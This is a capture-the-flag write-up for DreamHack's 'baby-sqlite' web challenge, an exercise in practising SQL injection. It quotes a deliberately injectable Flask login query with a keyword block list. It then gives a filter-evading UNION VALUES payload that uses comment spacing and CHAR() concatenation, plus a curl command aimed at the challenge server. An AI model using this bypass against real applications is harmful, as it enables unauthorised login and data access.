# baby-sqlite — DreamHack

> **Room / Challenge:** baby-sqlite (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** baby-sqlite (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1`
- **Level:** `2`
- **Date:** `13-11-2025`

---

## Goal

Leveraging SQL Injection to bypass the check and get the flag.

## My Solution

The app has the `/login` route:

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    uid = request.form.get('uid', '').lower()
    upw = request.form.get('upw', '').lower()
    level = request.form.get('level', '9').lower()

    sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
    for x in sqli_filter:
        if uid.find(x) != -1:
            return 'No Hack!'
        if upw.find(x) != -1:
            return 'No Hack!'
        if level.find(x) != -1:
            return 'No Hack!'


    with app.app_context():
        conn = get_db()
        query = f"SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};"
        try:
            req = conn.execute(query)
            result = req.fetchone()

            if result is not None:
                uid = result[0]
                if uid == 'admin':
                    return FLAG
        except:
            return 'Error!'
    return 'Good!'
```

So here we have to login as `admin` to get the flag:

```python
if result is not None:
    uid = result[0]
    if uid == 'admin':
        return FLAG
```

However, there is a problem, database doesn't have admin account:

```python
conn.execute('CREATE TABLE users (uid text, upw text, level integer);')
conn.execute("INSERT INTO users VALUES ('dream','cometrue', 9);")
```

The level data is what we can use to inject our payload. SQLite (and other SQL dialects) allows VALUES to construct a new row. `VALUES('admin')` creates a row with the value `'admin'`.

```
level=0/**/UNION/**/VALUES(CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110))
```

Here we can use this `curl` command to get the flag:

```bash
curl -X POST "http://host3.dreamhack.games:17968/login" -d "uid=dream&upw=invalid&level=0/**/UNION/**/VALUES(CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110))"
```

![Guide image](./screenshots/1.png)
